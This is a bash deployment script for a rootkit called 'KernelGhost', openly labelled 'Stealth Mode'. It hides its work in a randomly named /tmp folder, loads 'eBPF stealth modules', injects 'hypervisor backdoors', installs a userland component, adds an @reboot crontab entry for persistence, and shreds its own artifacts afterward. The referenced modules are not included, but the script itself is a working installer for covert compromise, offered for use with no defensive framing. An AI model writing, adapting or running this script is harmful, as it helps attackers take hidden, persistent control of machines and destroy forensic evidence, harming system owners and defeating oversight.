#!/bin/bash
# KernelGhost Deployment Script (Stealth Mode)

set -euo pipefail

# Anti-detection measures
RANDOM_SUBDIR=$(tr -dc A-Za-z0-9 </dev/urandom | head -c 16)
mkdir -p "/tmp/${RANDOM_SUBDIR}"
cd "/tmp/${RANDOM_SUBDIR}"

# Check dependencies
check_deps() {
	for cmd in bpftool insmod shred; do
		if ! command -v $cmd &> /dev/null; then
			echo "[-] Missing dependency: $cmd"
			exit 1
		fi
	done
}

# Load components
load_ebpf() {
	echo "[*] Loading eBPF stealth modules..."
	make -C src/eBPF_stealth deploy >/dev/null 2>&1
}

load_hypervisor() {
	echo "[*] Injecting hypervisor backdoors..."
	make -C src/hypervisor deploy >/dev/null 2>&1
}

setup_persistence() {
	echo "[*] Establishing persistence..."
	crontab -l | { cat; echo "@reboot /usr/local/bin/ghostctl revive"; } | crontab -
}

cleanup() {
	echo "[*] Securely erasing artifacts..."
	shred -zu ../${RANDOM_SUBDIR}/*
	rm -rf "../${RANDOM_SUBDIR}"
}

main() {
	check_deps
	load_ebpf
	load_hypervisor
	make -C src/userland install
	setup_persistence
	cleanup
	echo "[+] KernelGhost deployed successfully"
}

main "$@"